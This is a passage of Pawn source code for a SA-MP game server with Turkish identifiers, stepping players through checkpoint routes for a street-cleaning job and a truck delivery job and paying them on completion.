		    SetPlayerCheckpoint(playerid, 1338.1282,-1422.9276,13.1080, 7.5);
		    tCheckpoint[playerid] = 15;
		}
		else if(tCheckpoint[playerid] == 15)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1300.1675,-1529.6285,13.1079, 7.5);
		    tCheckpoint[playerid] = 16;
		}
		else if(tCheckpoint[playerid] == 16)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1264.7723,-1568.1627,13.1080, 7.5);
		    tCheckpoint[playerid] = 17;
		}
		else if(tCheckpoint[playerid] == 17)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1180.6282,-1568.2000,13.0805, 7.5);
		    tCheckpoint[playerid] = 18;
		}
		else if(tCheckpoint[playerid] == 18)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1145.8901,-1611.7152,13.5064, 7.5);
		    tCheckpoint[playerid] = 19;
		}
		else if(tCheckpoint[playerid] == 19)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1146.1735,-1682.2943,13.5064, 7.5);
		    tCheckpoint[playerid] = 20;
		}
		else if(tCheckpoint[playerid] == 20)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1094.0621,-1707.9779,13.1079, 7.5);
		    tCheckpoint[playerid] = 21;
		}
		else if(tCheckpoint[playerid] == 21)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1041.6029,-1644.7969,13.1079, 7.5);
		    tCheckpoint[playerid] = 22;
		}
		else if(tCheckpoint[playerid] == 22)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1041.3998,-1603.6305,13.1079, 7.5);
		    tCheckpoint[playerid] = 23;
		}
		else if(tCheckpoint[playerid] == 23)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 989.2262,-1568.1809,13.1080, 7.5);
		    tCheckpoint[playerid] = 24;
		}
		else if(tCheckpoint[playerid] == 24)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 903.4747,-1568.1982,13.1156, 7.5);
		    tCheckpoint[playerid] = 25;
		}
		else if(tCheckpoint[playerid] == 25)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 813.8745,-1589.7297,13.1080, 7.5);
		    tCheckpoint[playerid] = 26;
		}
		else if(tCheckpoint[playerid] == 26)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 722.6635,-1582.6152,13.9872, 7.5);
		    tCheckpoint[playerid] = 27;
		}
		else if(tCheckpoint[playerid] == 27)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 641.5124,-1547.7725,14.9484, 7.5);
		    tCheckpoint[playerid] = 28;
		}
		else if(tCheckpoint[playerid] == 28)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 641.0220,-1436.5397,13.7594, 7.5);
		    tCheckpoint[playerid] = 29;
		}
		else if(tCheckpoint[playerid] == 29)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 612.2345,-1391.2993,13.1235, 7.5);
		    tCheckpoint[playerid] = 30;
		}
		else if(tCheckpoint[playerid] == 30 && !SevkiyatGorev[playerid] && GetPVarInt(playerid, "TGorev") == 1)
		{
		    new oldcar = GetPlayerVehicleID(playerid);
		    DisablePlayerCheckpoint(playerid);
		    MotoruKapat(oldcar);
		    SetVehicleToRespawn(oldcar);
			Aractamiri(oldcar);
			SetPlayerPos(playerid, Veriler[temizlikX], Veriler[temizlikY], Veriler[temizlikZ]);
			SetPVarInt(playerid, "TIsbasi", 0);
			SetPVarInt(playerid, "TGorev", 0);
			new mstring[128], ucret = floatround(120*UstalikKatSayi(playerid));
			format(mstring, sizeof(mstring), "%d metre yol temizleyerek %d$ kazandýnýz.",TemizlikYol[playerid], ucret);
			Bilgi(playerid, mstring);
			GivePlayerCash(playerid, ucret);
			tCheckpoint[playerid] = 0;
		}
	}
	//kamyon
	if(!GetPVarInt(playerid, "ParkCP") && meslekbul[playerid] != 1 && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && KamGorevde[playerid] == 1 && Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
	{
		if(KamCheckpoint[playerid] == 1)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
		    {
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2227.3994,-2635.8030,13.1024, 7.5);
			    KamCheckpoint[playerid] = 2;
			}
		}
		else if(KamCheckpoint[playerid] == 2)
		{
			if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
		    {
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2228.6125,-2509.0547,13.0409, 7.5);
			    KamCheckpoint[playerid] = 3;
			}
		}
		else if(KamCheckpoint[playerid] == 3)
		{
			if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
		    {
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2187.3767,-2492.4419,13.0796, 7.5);
			    KamCheckpoint[playerid] = 4;
			}
		}
		else if(KamCheckpoint[playerid] == 4)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
		    {
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2291.5024,-2286.5134,13.0852, 7.5);
			    KamCheckpoint[playerid] = 5;
			}
		}
		else if(KamCheckpoint[playerid] == 5)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
		    {
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2379.5759,-2201.2737,13.0806, 7.5);
			    KamCheckpoint[playerid] = 6;
			}
		}
		else if(KamCheckpoint[playerid] == 6)
		{
			if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2613.7573,-2173.2209,11.6598, 7.5);
			    KamCheckpoint[playerid] = 7;
			}
		}
		else if(KamCheckpoint[playerid] == 7)
		{
			if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2801.0073,-2143.0464,10.6352, 7.5);
			    KamCheckpoint[playerid] = 8;
			}
		}
		else if(KamCheckpoint[playerid] == 8)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2840.8516,-2016.9979,10.6430, 7.5);
			    KamCheckpoint[playerid] = 9;
			}
		}
		else if(KamCheckpoint[playerid] == 9)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2853.5361,-1772.8279,10.5803, 7.5);
			    KamCheckpoint[playerid] = 10;
			}
		}
		else if(KamCheckpoint[playerid] == 10)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2920.1973,-1516.6205,10.5805, 7.5);
			    KamCheckpoint[playerid] = 11;
			}
		}
		else if(KamCheckpoint[playerid] == 11)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2910.4163,-1288.4353,10.5805, 7.5);
			    KamCheckpoint[playerid] = 12;
			}
		}
		else if(KamCheckpoint[playerid] == 12)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2894.6902,-918.9571,10.5805, 7.5);
			    KamCheckpoint[playerid] = 13;
			}
		}
		else if(KamCheckpoint[playerid] == 13)
		{
			if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2898.7725,-670.4222,10.5413, 7.5);
			    KamCheckpoint[playerid] = 14;
			}
		}
		else if(KamCheckpoint[playerid] == 14)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2870.1865,-506.3173,15.2444, 7.5);
			    KamCheckpoint[playerid] = 15;
			}
		}
		else if(KamCheckpoint[playerid] == 15)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2755.5574,-373.1050,24.4320, 7.5);
			    KamCheckpoint[playerid] = 16;
			}
		}
		else if(KamCheckpoint[playerid] == 16)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2738.9580,-221.0473,28.9297, 7.5);
			    KamCheckpoint[playerid] = 17;
			}
		}
		else if(KamCheckpoint[playerid] == 17)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2775.0703,21.9109,33.3199, 7.5);
			    KamCheckpoint[playerid] = 18;
			}
		}
		else if(KamCheckpoint[playerid] == 18)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2714.5667,299.8154,19.9712, 7.5);
			    KamCheckpoint[playerid] = 19;
			}
		}
		else if(KamCheckpoint[playerid] == 19)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2298.7393,333.0563,32.3722, 7.5);
		    	KamCheckpoint[playerid] = 20;
			}
		}
		else if(KamCheckpoint[playerid] == 20)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2337.4695,378.3587,26.4751, 7.5);
			    KamCheckpoint[playerid] = 21;
			}
		}
		else if(KamCheckpoint[playerid] == 21)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2341.8345,226.6921,26.0403, 7.5);
			    KamCheckpoint[playerid] = 22;
            }
		}
		else if(KamCheckpoint[playerid] == 22)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2311.6257,216.7190,24.9563, 7.5);
			    KamCheckpoint[playerid] = 23;
			}
		}
		else if(KamCheckpoint[playerid] == 23)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 2148.6909,242.0850,14.2588, 7.5);
			    KamCheckpoint[playerid] = 24;
			}
		}
		else if(KamCheckpoint[playerid] == 24)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 1992.8840,352.2473,26.7124, 7.5);
			    KamCheckpoint[playerid] = 25;
			}
		}
		else if(KamCheckpoint[playerid] == 25)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 1631.3138,383.5532,19.5467, 7.5);
			    KamCheckpoint[playerid] = 26;
			}
		}
		else if(KamCheckpoint[playerid] == 26)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 1376.8585,447.8835,19.5757, 7.5);
			    KamCheckpoint[playerid] = 27;
			}
		}
		else if(KamCheckpoint[playerid] == 27)
		{
		    if(Arac[GetPlayerVehicleID(playerid)][atip] == 14 && !GetPlayerVehicleSeat(playerid))
   			{
			    DisablePlayerCheckpoint(playerid);
			    SetPlayerCheckpoint(playerid, 1182.3567,547.3520,19.5883, 7.5);
			    KamCheckpoint[playerid] = 28;
			}
		}
		else if(KamCheckpoint[playerid] == 28)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1100.7960,577.9954,19.5869, 7.5);
		    KamCheckpoint[playerid] = 29;
		}
		else if(KamCheckpoint[playerid] == 29)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 1028.9670,501.4522,19.5883, 7.5);
		    KamCheckpoint[playerid] = 30;
		}
		else if(KamCheckpoint[playerid] == 30)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 962.3133,393.8509,19.5918, 7.5);
		    KamCheckpoint[playerid] = 31;
		}
		else if(KamCheckpoint[playerid] == 31)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 793.6788,335.1076,19.5926, 7.5);
		    KamCheckpoint[playerid] = 32;
		}
		else if(KamCheckpoint[playerid] == 32)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 633.3708,312.5673,19.6416, 7.5);
		    KamCheckpoint[playerid] = 33;
		}
		else if(KamCheckpoint[playerid] == 33)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 617.6514,339.3333,18.8413, 7.5);
		    KamCheckpoint[playerid] = 34;
		}
		else if(KamCheckpoint[playerid] == 34)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 432.5369,604.0905,18.6293, 7.5);
		    KamCheckpoint[playerid] = 35;
		}
		else if(KamCheckpoint[playerid] == 35)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 327.8792,751.3792,10.6718, 7.5);
		    KamCheckpoint[playerid] = 36;
		}
		else if(KamCheckpoint[playerid] == 36)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 232.7949,961.4117,27.7604, 7.5);
		    KamCheckpoint[playerid] = 37;
		}
		else if(KamCheckpoint[playerid] == 37)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 241.1767,975.0237,27.9013, 7.5);
		    KamCheckpoint[playerid] = 38;
		}
		else if(KamCheckpoint[playerid] == 38)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 447.8414,1029.7130,28.1416, 7.5);
		    KamCheckpoint[playerid] = 39;
		}
		else if(KamCheckpoint[playerid] == 39)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 715.5042,1101.4166,28.1497, 7.5);
		    KamCheckpoint[playerid] = 40;
		}
		else if(KamCheckpoint[playerid] == 40)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 808.4032,1134.7333,28.1498, 7.5);
		    KamCheckpoint[playerid] = 41;
		}
		else if(KamCheckpoint[playerid] == 41)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 827.5858,1116.9873,29.5382, 7.5);
		    KamCheckpoint[playerid] = 42;
		}
		else if(KamCheckpoint[playerid] == 42)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 884.1192,1022.0598,15.3823, 7.5);
		    KamCheckpoint[playerid] = 43;
		}
		else if(KamCheckpoint[playerid] == 43)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 897.4508,911.3243,13.0576, 7.5);
		    KamCheckpoint[playerid] = 44;
		}
		else if(KamCheckpoint[playerid] == 44)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 813.1865,847.5060,10.0555, 7.5);
		    KamCheckpoint[playerid] = 45;
		}
		else if(KamCheckpoint[playerid] == 45)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 786.9033,847.2557,5.5323, 7.5);
		    KamCheckpoint[playerid] = 46;
		}
		else if(KamCheckpoint[playerid] == 46)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 758.6447,897.4787,-1.5380, 7.5);
		    KamCheckpoint[playerid] = 47;
		}
		else if(KamCheckpoint[playerid] == 47)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 703.0389,978.0960,-11.8846, 7.5);
		    KamCheckpoint[playerid] = 48;
		}
		else if(KamCheckpoint[playerid] == 48)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 687.4982,956.0375,-14.1314, 7.5);
		    KamCheckpoint[playerid] = 49;
		}
		else if(KamCheckpoint[playerid] == 49)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 725.8972,899.6597,-24.3913, 7.5);
		    KamCheckpoint[playerid] = 50;
		}
		else if(KamCheckpoint[playerid] == 50)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 701.2366,917.5732,-30.6130, 7.5);
		    KamCheckpoint[playerid] = 51;
		}
		else if(KamCheckpoint[playerid] == 51)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 636.4650,947.1863,-35.5719, 7.5);
		    KamCheckpoint[playerid] = 52;
		}
		else if(KamCheckpoint[playerid] == 52)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 618.9661,910.0281,-44.4526, 7.5);
		    KamCheckpoint[playerid] = 53;
		}
		else if(KamCheckpoint[playerid] == 53)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 561.9812,899.5688,-43.2819, 7.5);
		    KamCheckpoint[playerid] = 54;
		}
		else if(KamCheckpoint[playerid] == 54)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 503.1464,904.0121,-33.2770, 7.5);
		    KamCheckpoint[playerid] = 55;
		}
		else if(KamCheckpoint[playerid] == 55)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 502.1440,874.1144,-33.3970, 7.5);
		    KamCheckpoint[playerid] = 56;
		}
		else if(KamCheckpoint[playerid] == 56)
		{
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, 583.2269,845.4114,-42.7377, 7.5);
		    KamCheckpoint[playerid] = 57;
		}
		else if(KamCheckpoint[playerid] == 57)
        {
            DisablePlayerCheckpoint(playerid);
			SetTimerEx("kamyonbitiyo",10000, false,"u",playerid);
			TogglePlayerControllable(playerid, 0);
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Bekleyin..", 5000, 3);
            SetPlayerCheckpoint(playerid, 642.0637,875.8828,-43.1442, 7.5);
            KamCheckpoint[playerid] = 58;
        }
        else if(KamCheckpoint[playerid] == 58)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 638.8715,906.7560,-43.1503, 7.5);
            KamCheckpoint[playerid] = 59;
        }
        else if(KamCheckpoint[playerid] == 59)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 654.7686,946.3213,-35.3514, 7.5);
            KamCheckpoint[playerid] = 60;
        }
        else if(KamCheckpoint[playerid] == 60)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 711.8227,883.2041,-27.7585, 7.5);
            KamCheckpoint[playerid] = 61;
        }
        else if(KamCheckpoint[playerid] == 61)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 712.4824,944.9745,-19.0232, 7.5);
            KamCheckpoint[playerid] = 62;
        }
        else if(KamCheckpoint[playerid] == 62)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 717.2418,955.3588,-7.6801, 7.5);
            KamCheckpoint[playerid] = 63;
        }
        else if(KamCheckpoint[playerid] == 63)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 754.9158,890.8271,-1.5139, 7.5);
            KamCheckpoint[playerid] = 64;
        }
        else if(KamCheckpoint[playerid] == 64)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 787.9583,835.7074,5.6589, 7.5);
            KamCheckpoint[playerid] = 65;
        }
        else if(KamCheckpoint[playerid] == 65)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 860.5325,861.3563,13.0576, 7.5);
            KamCheckpoint[playerid] = 66;
        }
        else if(KamCheckpoint[playerid] == 66)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 918.0812,937.4260,13.0570, 7.5);
            KamCheckpoint[playerid] = 67;
        }
        else if(KamCheckpoint[playerid] == 67)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 862.6433,1083.8032,25.8422, 7.5);
            KamCheckpoint[playerid] = 68;
        }
        else if(KamCheckpoint[playerid] == 68)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 822.9412,1136.2356,28.7600, 7.5);
            KamCheckpoint[playerid] = 69;
        }
        else if(KamCheckpoint[playerid] == 69)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 742.9583,1116.4410,28.0353, 7.5);
            KamCheckpoint[playerid] = 70;
        }
        else if(KamCheckpoint[playerid] == 70)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 556.3666,1065.4061,28.0388, 7.5);
            KamCheckpoint[playerid] = 71;
        }
        else if(KamCheckpoint[playerid] == 71)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 319.0696,1004.8493,28.0473, 7.5);
            KamCheckpoint[playerid] = 72;
        }
        else if(KamCheckpoint[playerid] == 72)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 234.4545,978.3148,27.9016, 7.5);
            KamCheckpoint[playerid] = 73;
        }
        else if(KamCheckpoint[playerid] == 73)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 228.9800,957.2595,27.6881, 7.5);
            KamCheckpoint[playerid] = 74;
        }
        else if(KamCheckpoint[playerid] == 74)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 305.8737,784.3704,13.3310, 7.5);
            KamCheckpoint[playerid] = 75;
        }
        else if(KamCheckpoint[playerid] == 75)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 432.2825,594.5847,18.6272, 7.5);
            KamCheckpoint[playerid] = 76;
        }
        else if(KamCheckpoint[playerid] == 76)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 606.1227,344.8984,18.6344, 7.5);
            KamCheckpoint[playerid] = 77;
        }
        else if(KamCheckpoint[playerid] == 77)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 616.4075,321.5795,19.3573, 7.5);
            KamCheckpoint[playerid] = 78;
        }
        else if(KamCheckpoint[playerid] == 78)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 646.4081,307.2529,19.5877, 7.5);
            KamCheckpoint[playerid] = 79;
        }
        else if(KamCheckpoint[playerid] == 79)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 841.9037,339.7027,19.5884, 7.5);
            KamCheckpoint[playerid] = 80;
        }
        else if(KamCheckpoint[playerid] == 80)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1038.5936,501.3723,19.5883, 7.5);
            KamCheckpoint[playerid] = 81;
        }
        else if(KamCheckpoint[playerid] == 81)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1107.8511,571.1155,19.5883, 7.5);
            KamCheckpoint[playerid] = 82;
        }
        else if(KamCheckpoint[playerid] == 82)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1289.9728,486.5233,19.5883, 7.5);
            KamCheckpoint[playerid] = 83;
        }
        else if(KamCheckpoint[playerid] == 83)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1587.6403,379.7583,19.5885, 7.5);
            KamCheckpoint[playerid] = 84;
        }
        else if(KamCheckpoint[playerid] == 84)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1874.8125,357.9611,19.7013, 7.5);
            KamCheckpoint[playerid] = 85;
        }
        else if(KamCheckpoint[playerid] == 85)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 1999.8448,342.6583,27.7550, 7.5);
            KamCheckpoint[playerid] = 86;
        }
        else if(KamCheckpoint[playerid] == 86)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2054.9421,257.7694,24.8933, 7.5);
            KamCheckpoint[playerid] = 87;
        }
        else if(KamCheckpoint[playerid] == 87)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2161.3938,234.9280,14.2656, 7.5);
            KamCheckpoint[playerid] = 88;
        }
        else if(KamCheckpoint[playerid] == 88)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2329.1760,211.1774,25.9850, 7.5);
            KamCheckpoint[playerid] = 89;
        }
        else if(KamCheckpoint[playerid] == 89)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2346.2646,233.4958,26.0414, 7.5);
            KamCheckpoint[playerid] = 90;
        }
        else if(KamCheckpoint[playerid] == 90)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2346.0789,275.3871,26.0403, 7.5);
            KamCheckpoint[playerid] = 91;
        }
        else if(KamCheckpoint[playerid] == 91)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2403.5710,289.6292,31.0673, 7.5);
            KamCheckpoint[playerid] = 92;
        }
        else if(KamCheckpoint[playerid] == 92)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2502.7695,292.9035,29.4332, 7.5);
            KamCheckpoint[playerid] = 93;
        }
        else if(KamCheckpoint[playerid] == 93)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2662.1582,300.7206,39.4060, 7.5);
            KamCheckpoint[playerid] = 94;
        }
        else if(KamCheckpoint[playerid] == 94)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2754.4570,175.7879,21.0031, 7.5);
            KamCheckpoint[playerid] = 95;
        }
        else if(KamCheckpoint[playerid] == 95)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2747.2766,-105.6528,34.4286, 7.5);
            KamCheckpoint[playerid] = 96;
        }
        else if(KamCheckpoint[playerid] == 96)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2708.7148,-231.5487,29.5532, 7.5);
            KamCheckpoint[playerid] = 97;
        }
        else if(KamCheckpoint[playerid] == 97)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2715.1685,-365.1943,26.8109, 7.5);
            KamCheckpoint[playerid] = 98;
        }
        else if(KamCheckpoint[playerid] == 98)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2833.3208,-497.4691,17.1402, 7.5);
            KamCheckpoint[playerid] = 99;
        }
        else if(KamCheckpoint[playerid] == 99)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2873.5037,-700.0186,10.5414, 7.5);
            KamCheckpoint[playerid] = 100;
        }
        else if(KamCheckpoint[playerid] == 100)
        {
            DisablePlayerCheckpoint(playerid);
            SetPlayerCheckpoint(playerid, 2869.4009,-922.9257,10.5805, 7.5);
